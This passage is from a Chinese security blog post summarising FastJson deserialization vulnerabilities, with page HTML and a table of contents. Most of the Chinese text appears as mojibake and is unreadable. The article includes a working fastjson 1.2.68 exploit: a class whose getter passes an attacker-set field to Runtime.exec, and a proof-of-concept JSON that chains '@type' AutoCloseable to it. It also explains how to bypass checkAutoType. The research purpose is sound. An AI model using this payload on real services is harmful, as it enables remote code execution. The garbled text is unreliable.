æ­¤è°ƒç”¨loadClass()å‡½æ•°çš„æ—¶å€™æ˜¯ä¸å¼€å¯cacheå³ç¼“å­˜çš„ï¼š\nä½¿ç”¨AppClassLoaderæ¥åŠ è½½com.reus09.Evil.ExecThrowableç±»å¹¶è¿”å›ã€‚\næ¥ç€åˆ¤æ–­jsonTypeï¼Œå¦‚æœä¸ºtrueçš„è¯ç›´æ¥æ·»åŠ Mappingç¼“å­˜å¹¶è¿”å›ç±»ï¼Œå¦åˆ™æ¥ç€åˆ¤æ–­è¿”å›çš„ç±»æ˜¯å¦æ˜¯ClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™å®ç°è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetï¼š\nå¾€ä¸‹ï¼Œå¦‚æœexpectClassä¸ä¸ºnullï¼Œåˆ™åˆ¤æ–­ç›®æ ‡ç±»æ˜¯å¦æ˜¯expectClassç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯å°±æ·»åŠ åˆ°Mappingç¼“å­˜ä¸­å¹¶ç›´æ¥è¿”å›è¯¥ç›®æ ‡ç±»ï¼Œå¦åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼Œå› æ­¤è¿™é‡Œæ¶æ„ç±»å¿…é¡»è¦å®ç°Throwableç±»\ncheckAutoTypeè°ƒç”¨å®Œåï¼Œå°±æ‰§è¡ŒcreateExceptionå‡½æ•°æ¥åˆ›å»ºå¼‚å¸¸ç±»çš„å®ä¾‹ï¼Œåœ¨é‡Œé¢åå°„è°ƒç”¨æ„é€ å‡½æ•°ï¼Œç„¶åå®ä¾‹åŒ–ã€‚å®ç°è§¦å‘æ¼æ´ã€‚\nJavaBeanDeserializeråˆ©ç”¨ 1 2 3 4 5 6 7 if (expectClass == null) { expectClassFlag = false; } else if (expectClass != Object.class \u0026\u0026 expectClass != Serializable.class \u0026\u0026 expectClass != Cloneable.class \u0026\u0026 expectClass != Closeable.class \u0026\u0026 expectClass != EventListener.class \u0026\u0026 expectClass != Iterable.class \u0026\u0026 expectClass != Collection.class) { expectClassFlag = true; }else{ expectClassFlag = false; } å¯¹äºè¿™æ®µä»£ç æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„æœŸæœ›ç±»ï¼Œä¸æ˜¯objectã€Serializableã€Cloneableã€Closeableã€EventListenerã€Iterableã€Collectionè¿™äº›ç±»ï¼Œå¹¶ä¸”ä»–ä¹Ÿä¸èƒ½åœ¨é»‘åå•é‡Œé¢https://github.com/LeadroyaL/fastjson-blacklistï¼Œå¹¶ä¸”è¿™ä¸ªç±»éœ€è¦åœ¨ç¼“å­˜mappingsä¸­ï¼Œæ‰¾åˆ°äº†java.lang.AutoCloseableå’Œjava.util.BitSetä¸¤ä¸ªæ¥å£ã€‚\nè¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰å®ç°äº†ä¸€ä¸ªç»§æ‰¿äº†AutoCloseableç±»çš„å­ç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.reus09.Evil; import java.io.Closeable; import java.io.IOException; /** * @ClassName ExecCloseable * @Description TODO * @Author reus09 * @Date 2023/4/20 00:09 * @Version 1.0 **/ public class ExecCloseable implements AutoCloseable { private String domain; public String getDomain() { try { Runtime.getRuntime().exec(domain); } catch (IOException e) { e.printStackTrace(); } return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public void close() throws IOException { } } POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.reus09.Evil.ExecCloseable\", \"domain\": \"open /System/Applications/Calculator.app\" } è°ƒè¯• ç¬¬ä¸€æ¬¡è¿›å…¥CheckAutoType()å‡½æ•°çš„æ‰§è¡Œé€»è¾‘å’Œå‰é¢è®²åˆ°çš„java.lang.Exceptionå¤„ç†é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·æ˜¯åœ¨mappingsä¸­è·å–\nåé¢é€»è¾‘å·®ä¸å¤šï¼Œè·å¾—clazzä¹‹åï¼Œç„¶åå›åˆ°com.alibaba.fastjson.parser.DefaultJSONParser#parseObjectæ–¹æ³•ï¼Œç„¶åè°ƒç”¨ParserConfig#getDeserializeræ–¹æ³•æ¥è·å¾—ååºåˆ—åŒ–å™¨ï¼Œå› ä¸ºAutoCloseableä¸æ»¡è¶³ä¸Šè¿°ç±»çš„è·å¾—ååºåˆ—åŒ–å™¨çš„æ¡ä»¶ï¼Œæ‰€ä»¥åˆ°äº†æœ€åä¸€æ­¥é€šè¿‡ParserConfig#createJavaBeanDeserializer æ–¹æ³•æ¥æ„é€  JavaBeanDeserializerå¯¹è±¡ã€‚\nä¹‹åå°±è°ƒç”¨JavaBeanDeserializerçš„deserialzeæ–¹æ³•ï¼Œ\nåœ¨ deserialze() æ–¹æ³•ä¸­åˆåšäº†ä¸€æ¬¡ checkAutoType æ£€æµ‹ï¼Œæ­¤å¤„ç›´æ¥å°†ç¬¬äºŒä¸ª @type çš„ç±»åï¼Œå’Œå‰é¢æ„é€  JavaBeanDeserializer å¯¹è±¡æ—¶æŒ‡å®šçš„æœŸæœ›ç±»ç›´æ¥ä¼ äº†è¿›æ¥ã€‚\nç„¶åå°±å’Œåœ¨ThrowableDeserializerçš„æ­¥éª¤å·®ä¸å¤šï¼Œæ¥åˆ°expectClassä¸ä¸ºç©ºçš„æƒ…å†µï¼Œå°†æ¶æ„ç±»æ·»åŠ åˆ°mappingsé‡Œé¢ï¼Œç„¶åè¿”å›clazzã€‚\ncheckAutoType()è°ƒç”¨å®Œè¿”å›ç±»ä¹‹åï¼Œç„¶åå†æ¬¡è·å¾— JavaBeanDeserializerååºåˆ—åŒ–å™¨ï¼Œåœ¨å®ƒçš„deserialzeæ–¹æ³•ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#createInstance()é€šè¿‡ä»£ç†å®ä¾‹åŒ–æ¶æ„ç±»å®ä¾‹è¿›è€Œè°ƒç”¨å…¶æ„é€ å‡½æ•°ä»è€ŒæˆåŠŸè§¦å‘æ¼æ´ã€‚\nfastjson-1.2.80 è§ä¹‹å‰æ–‡ç« ã€‚\næ€»ç»“ ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬ç›´åˆ°å¦‚æœæƒ³è¦é€šè¿‡checkAutoTypeçš„æ£€éªŒï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•:\nä¼ å…¥çš„ç±»åœ¨ç™½åå•ä¸­ å¼€å¯äº†autotype(autoTypeSupport is true) ä½¿ç”¨äº†JSONTypeæ³¨è§£(å¦‚:fastjson.annotation.JSONType) æŸäº›æœŸæœ›ç±» (ç»§æ‰¿äºexpectClass) è¦ååºåˆ—åŒ–çš„ç±»åœ¨cacheä¸­ (TypeUtils.mappingsåˆ—è¡¨ä¸­æœ‰ @type æŒ‡å®šçš„ç±») ä½†å…·ä½“å¯ä»¥æ“ä½œçš„è·¯çº¿ã€æ”»å‡»é“¾æ„Ÿè§‰è¿˜æ˜¯è¦å¯¹ä»£ç æœ‰è¶³å¤Ÿçš„ç†Ÿç»ƒæŒæ¡ã€‚\næ€»çš„æ¥è¯´ï¼Œæ„Ÿè§‰fastjsonæ¼æ´çš„åˆ©ç”¨å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸€äº›é€»è¾‘ä¸Šçš„ä»£ç é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯é»‘å®¢å·§å¦™çš„æ”»å‡»é“¾æ„é€ ã€‚\næœ€åï¼Œå­¦ä¹ åˆ°äº†ä¸€äº›FastJsonååºåˆ—åŒ–çš„åŸºæœ¬åŸç†ï¼Œä¹‹å‰éƒ½æ˜¯äº‘é‡Œé›¾é‡Œï¼Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚æ­¤å¤–ï¼Œå¯¹FastJsonçš„parseã€parseObjectç›¸å…³æ–¹æ³•çš„åŒºåˆ«ã€‚è¿˜æœ‰å°±æ˜¯å‘ç°ç°åœ¨å†™åšå®¢å¾€å¾€éƒ½æ˜¯å¯¹åˆ«äººçš„æ–‡ç« å¤§æŠ„ç‰¹æŠ„ï¼Œè‡ªå·±çš„ä¸œè¥¿ã€æ€è€ƒå¤ªå°‘äº†ï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·å†™?ä¸ºä»€ä¹ˆè¿™ä¹ˆæ€è€ƒ?ä»¥åè¿˜æ˜¯éœ€è¦åŠªåŠ›ã€‚\nReference https://su18.org/post/fastjson/#1-fastjson-1224 http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/ https://www.yang99.top/index.php/archives/71/ https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl https://juejin.cn/post/6846687594130964488#heading-3 https://blog.csdn.net/hosaos/article/details/106982555 ",
  "wordCount" : "16109",
  "inLanguage": "en",
  "datePublished": "2022-10-12T14:04:36+08:00",
  "dateModified": "2022-10-12T14:04:36+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;Â»&nbsp;<a href="/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“
    </h1>
    <div class="post-meta"><span title='2022-10-12 14:04:36 +0800 +0800'>2022-10-12</span>&nbsp;Â·&nbsp;33 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d" aria-label="æ¼æ´ä»‹ç»">æ¼æ´ä»‹ç»</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%96%b9%e6%b3%95" aria-label="ååºåˆ—åŒ–æ–¹æ³•">ååºåˆ—åŒ–æ–¹æ³•</a></li>
                    <li>
                        <a href="#fastjson-1224%e5%88%86%e6%9e%90" aria-label="FastJson 1.2.24åˆ†æ"><code>FastJson 1.2.24</code>åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#templatesimpl-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="TemplatesImpl ååºåˆ—åŒ–"><code>TemplatesImpl</code> ååºåˆ—åŒ–</a></li>
                    <li>
                        <a href="#jdbcrowsetimpl--%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="JdbcRowSetImpl ååºåˆ—åŒ–"><code>JdbcRowSetImpl </code> ååºåˆ—åŒ–</a></li></ul>
                    </li>
                    <li>
                        <a href="#autotype%e4%b8%8echeckautotype" aria-label="AutoTypeä¸checkAutoType">AutoTypeä¸checkAutoType</a></li>
                    <li>
                        <a href="#%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="å†å²æ¼æ´åˆ†æ">å†å²æ¼æ´åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#fastjson-1225" aria-label="fastjson-1.2.25">fastjson-1.2.25</a></li>
                    <li>
                        <a href="#fastjson-1242" aria-label="fastjson-1.2.42">fastjson-1.2.42</a></li>
                    <li>
                        <a href="#fastjson-1243" aria-label="fastjson-1.2.43">fastjson-1.2.43</a></li>
                    <li>
                        <a href="#fastjson-1244" aria-label="fastjson-1.2.44">fastjson-1.2.44</a></li>
                    <li>
                        <a href="#fastjson-1245" aria-label="fastjson-1.2.45">fastjson-1.2.45</a></li>
                    <li>
                        <a href="#fastjson-1247" aria-label="fastjson-1.2.47">fastjson-1.2.47</a><ul>
                            
                    <li>
                        <a href="#%e5%88%86%e6%9e%90" aria-label="åˆ†æ">åˆ†æ</a></li>
                    <li>
                        <a href="#%e5%b0%8f%e7%bb%93" aria-label="å°ç»“">å°ç»“</a></li>
                    <li>
                        <a href="#%e8%b0%83%e8%af%95" aria-label="è°ƒè¯•">è°ƒè¯•</a></li>
                    <li>
                        <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac%e5%88%86%e6%9e%90" aria-label="å½±å“ç‰ˆæœ¬åˆ†æ">å½±å“ç‰ˆæœ¬åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#1225--fastjson--1232" aria-label="1.2.25 &amp;lt;= fastjson &amp;lt;= 1.2.32">1.2.25 &lt;= fastjson &lt;= 1.2.32</a><ul>
                            
                    <li>
                        <a href="#autotypesupport%e4%b8%batrue" aria-label="autoTypeSupportä¸ºtrue">autoTypeSupportä¸ºtrue</a></li>
                    <li>
                        <a href="#autotypesupport%e4%b8%bafalse" aria-label="autoTypeSupportä¸ºfalse">autoTypeSupportä¸ºfalse</a></li></ul>
                    </li>
                    <li>
                        <a href="#1233--fastjson--1247" aria-label="1.2.33 &amp;lt;= fastjson &amp;lt;= 1.2.47">1.2.33 &lt;= fastjson &lt;= 1.2.47</a><ul>
                            
                    <li>
                        <a href="#autotypesupport%e4%b8%batrue-1" aria-label="autoTypeSupportä¸ºtrue">autoTypeSupportä¸ºtrue</a></li>
                    <li>
                        <a href="#autotypesupport%e4%b8%bafalse-1" aria-label="autoTypeSupportä¸ºfalse">autoTypeSupportä¸ºfalse</a></li></ul>
                    </li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#fastjson-1268" aria-label="fastjson-1.2.68">fastjson-1.2.68</a><ul>
                            
                    <li>
                        <a href="#throwabledeserializer%e5%88%a9%e7%94%a8" aria-label="ThrowableDeserializeråˆ©ç”¨">ThrowableDeserializeråˆ©ç”¨</a><ul>
                            
                    <li>
                        <a href="#%e8%b0%83%e8%af%95-1" aria-label="è°ƒè¯•">è°ƒè¯•</a></li></ul>
                    </li>
                    <li>
                        <a href="#javabeandeserializer%e5%88%a9%e7%94%a8" aria-label="JavaBeanDeserializeråˆ©ç”¨">JavaBeanDeserializeråˆ©ç”¨</a><ul>
                            
                    <li>
                        <a href="#%e8%b0%83%e8%af%95-2" aria-label="è°ƒè¯•">è°ƒè¯•</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#fastjson-1280" aria-label="fastjson-1.2.80">fastjson-1.2.80</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93" aria-label="æ€»ç»“">æ€»ç»“</a></li>
                    <li>
                        <a href="#reference" aria-label="Reference">Reference</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><p>å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†<code>FastJson1.2.80</code>æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªç±»é‡Œé¢çš„æˆå‘˜ä¹Ÿå­˜åœ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥æ¶æ„JSONå®ç°ååºåˆ—æ¼æ´ï¼Œå¦ä¸€æ–¹é¢ç”±äº<code>FastJson1.2.25</code>ä¹‹åéƒ½æ˜¯å¯¹AutoTypeæœºåˆ¶è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥ä¹Ÿç®€å•å­¦ä¹ äº†AutoTypeCheckæœºåˆ¶ï¼Œè¿˜æœ‰ä¸€äº›æœŸæœ›ç±»çš„<code>Gadget</code>ã€‚æœ¬æ–‡ä¸»è¦å¯¹<code>FastJson</code>å¸¸ç”¨çš„çš„è§£æ<code>String</code>çš„parse,parseObjectç­‰æ–¹æ³•è¿›è¡Œåˆ†æï¼Œç„¶ååˆ†æAutoTypeCheckæœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯¹FastJsonå†å²æ¼æ´è¿›è¡Œç®€å•çš„æ•´ç†ã€‚</p>
<h2 id="æ¼æ´ä»‹ç»">æ¼æ´ä»‹ç»<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´ä»‹ç»">#</a></h2>
<p>è¿™é‡Œå°±å†ä»‹ç»ä¸€ä¸‹FastJsonçš„èƒŒæ™¯ã€‚</p>
<p>fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚</p>
<p>ç”±äºå…¶ç‰¹ç‚¹æ˜¯å¿«ï¼Œä»¥æ€§èƒ½ä¸ºä¼˜åŠ¿å¿«é€Ÿå é¢†äº†å¤§é‡ç”¨æˆ·ï¼Œå¹¶ä¸”å…¶ API ååˆ†ç®€æ´ï¼Œç”¨æˆ·é‡ååˆ†åºå¤§ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†è¿™æ ·çš„ç»„ä»¶ä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿå°†ä¼šæ˜¯å·¨å¤§çš„ï¼Œå› æ­¤ï¼Œfastjson ä»ç¬¬ä¸€æ¬¡æŠ¥å‘Šå®‰å…¨æ¼æ´è‡³ä»Šï¼Œè¿›è¡Œäº†è‹¥å¹²æ¬¡çš„å®‰å…¨æ›´æ–°ï¼Œä¹Ÿä¸å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œäº†æ¥æ¥å›å›å¤šæ¬¡çš„å®‰å…¨è¡¥ä¸-ç»•è¿‡çš„æµç¨‹ã€‚</p>
<p>è¿™é‡Œæ”¾ä¸€ä¸‹æ¡†æ¶å›¾</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1616458393831.png" alt="img"  />
</p>
<p>ä¸»è¦åŠŸèƒ½åœ¨<code>DefaultJSONParser</code>ç±»ä¸­å®ç°çš„ï¼Œåœ¨è¿™ä¸ªç±»ä¸­ä¼šåº”ç”¨å…¶ä»–çš„ä¸€äº›å¤–éƒ¨ç±»æ¥å®Œæˆåç»­æ“ä½œã€‚<code>ParserConfig</code>ä¸»è¦æ˜¯è¿›è¡Œé…ç½®ä¿¡æ¯çš„åˆå§‹åŒ–ï¼Œ<code>JSONLexer</code>ä¸»è¦æ˜¯å¯¹jsonå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†å¹¶åˆ†æï¼Œååºåˆ—åŒ–åœ¨<code>JavaBeanDeserializer</code>ä¸­å¤„ç†ã€‚</p>
<h2 id="ååºåˆ—åŒ–æ–¹æ³•">ååºåˆ—åŒ–æ–¹æ³•<a hidden class="anchor" aria-hidden="true" href="#ååºåˆ—åŒ–æ–¹æ³•">#</a></h2>
<p>å°† json æ•°æ®ååºåˆ—åŒ–æ—¶å¸¸ä½¿ç”¨çš„æ–¹æ³•ä¸º<code>parse()</code>ã€<code>parseObject()</code>ã€<code>parseArray()</code>ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•ä¹Ÿå‡åŒ…å«è‹¥å¹²é‡è½½æ–¹æ³•ï¼Œå¸¦æœ‰ä¸åŒå‚æ•°ï¼š</p>
<ul>
<li>ååºåˆ—åŒ–ç‰¹æ€§ï¼š<code>com.alibaba.fastjson.parser.Feature</code>ï¼Œ</li>
<li>ç±»çš„ç±»å‹ï¼š<code>java.lang.reflect.Type</code>ï¼Œç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–ç±»çš„ç±»å‹ã€‚</li>
<li>å¤„ç†æ³›å‹ååºåˆ—åŒ–ï¼š<code>com.alibaba.fastjson.TypeReference</code>ã€‚</li>
<li>ç¼–ç¨‹æ‰©å±•å®šåˆ¶ååºåˆ—åŒ–ï¼š<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>ï¼Œä¾‹å¦‚<code>ExtraProcessor</code> ç”¨äºå¤„ç†å¤šä½™çš„å­—æ®µï¼Œ<code>ExtraTypeProvider</code> ç”¨äºå¤„ç†å¤šä½™å­—æ®µæ—¶æä¾›ç±»å‹ä¿¡æ¯ã€‚</li>
</ul>
<p>è¿™é‡Œåˆ—ä¸¾ä¸€äº› fastjson åŠŸèƒ½è¦ç‚¹ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</li>
<li>fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ <code>get</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>ã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ <code>set</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> ä¸­ã€‚</li>
<li>ä½¿ç”¨ <code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter éƒ½è¢«è°ƒç”¨ã€‚</li>
<li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</li>
<li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_|-</code> å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ <code>_</code> å’Œ <code>-</code> è¿›è¡Œç»„åˆæ··æ·†ã€‚</li>
<li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</li>
</ul>
<p>ä¸ºäº†æµ‹è¯•ä»¥ä¸Šå†…å®¹ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªdemo</p>
